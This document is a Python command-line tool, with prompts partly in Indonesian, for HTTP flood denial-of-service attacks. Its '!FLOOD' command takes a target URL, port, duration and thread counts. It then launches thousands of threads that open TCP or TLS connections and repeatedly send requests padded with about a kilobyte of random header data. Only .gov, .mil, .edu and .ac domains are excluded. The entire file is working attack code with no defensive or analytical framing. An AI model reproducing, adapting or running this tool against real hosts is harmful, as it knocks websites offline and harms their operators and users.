# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    import ssl
    from urllib.parse import urlparse
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

# GLOBAL VARIABLES
stop_attack = threading.Event()

# DEF & CLASS
def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%&'()*+,-./:;?@[\\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

def generate_large_random_payload(size=1024):
    """Generate random string payload of given size in bytes."""
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choices(chars, k=size))

# DOS
def DoS_Attack(ip, host, port, method, booter_sent, data_type_loader_packet, use_https):
    if stop_attack.is_set():
        return
    url_path = ''
    path_get = ['PY_FLOOD', 'CHOICES_FLOOD']
    path_get_loader = random.choice(path_get)
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    try:
        s = socket.create_connection((ip, port), timeout=5)
        if use_https:
            context = ssl.create_default_context()
            s = context.wrap_socket(s, server_hostname=host)
        
        # Generate a large random header payload (~1KB)
        large_payload = generate_large_random_payload(1024)
        
        # Build packet with many headers to increase size
        packet_data = (
            f"{method} /{url_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"Cache-Control: no-cache\r\n"
            f"X-Requested-With: XMLHttpRequest\r\n"
            f"X-Payload: {large_payload}\r\n\r\n"
        ).encode()
        
        for _ in range(booter_sent * 10):
            if stop_attack.is_set():
                break
            s.sendall(packet_data)
    except Exception:
        pass
    finally:
        try:
            s.close()
        except:
            pass

def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_https):
    while time.time() < time_loader and not stop_attack.is_set():
        threads = []
        for _ in range(spam_loader * 10):
            if stop_attack.is_set():
                break
            th = threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet, use_https))
            th.daemon = True
            th.start()
            threads.append(th)
        for t in threads:
            t.join()

def countdown_timer(time_loader):
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
        sys.stdout.flush()
        time.sleep(1)
        remaining = int(time_loader - time.time())
    if not stop_attack.is_set():
        print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
        stop_attack.set()

def stop_attack_thread():
    input()
    stop_attack.set()
    print(f"\n{Fore.YELLOW}Serangan Dihentikan{Fore.RESET}")

def confirm_exit():
    while True:
        sys.stdout.write(f"\r{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}")
        sys.stdout.flush()
        choice = input().lower()
        if choice == 'y':
            print(f"\n{Fore.RED}Program terminated by user (Enter). Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            print()
            return

def command():
    global stop_attack
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not data_input_loader:
                confirm_exit()
                continue
            args_get = data_input_loader.split(" ")
            if args_get[0].lower() == "clear":
                clear_text()
            elif args_get[0].upper() == "!FLOOD":
                if len(args_get) == 10:
                    data_type_loader_packet = args_get[1].upper()
                    target_loader = args_get[2]
                    port_loader = int(args_get[3])
                    time_loader = time.time() + int(args_get[4]) * 60
                    spam_loader = int(args_get[5])
                    create_thread = min(int(args_get[6]), 100)
                    booter_sent = int(args_get[7])
                    methods_loader = args_get[8].upper()
                    spam_create_thread = min(int(args_get[9]), 100)
                    host = ''
                    ip = ''
                    use_https = target_loader.startswith("https://")
                    try:
                        parsed = urlparse(target_loader)
                        host = parsed.hostname
                        ip = socket.gethostbyname(host)
                        if any(host.endswith(ext) for ext in ['.gov', '.mil', '.edu', '.ac']):
                            print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
                            continue
                    except socket.gaierror:
                        print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
                        continue
                    stop_attack.clear()
                    print(f"{Fore.LIGHTCYAN_EX}Serangan diMulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}{Fore.RESET}")
                    for _ in range(create_thread):
                        for _ in range(spam_create_thread):
                            th = threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_https))
                            th.daemon = True
                            th.start()
                    threading.Thread(target=countdown_timer, args=(time_loader,), daemon=True).start()
                    threading.Thread(target=stop_attack_thread, daemon=True).start()
                    while not stop_attack.is_set() and time.time() < time_loader:
                        time.sleep(0.1)
                    stop_attack.set()
                    print()
                    continue
                else:
                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME_MIN> <SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> <HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
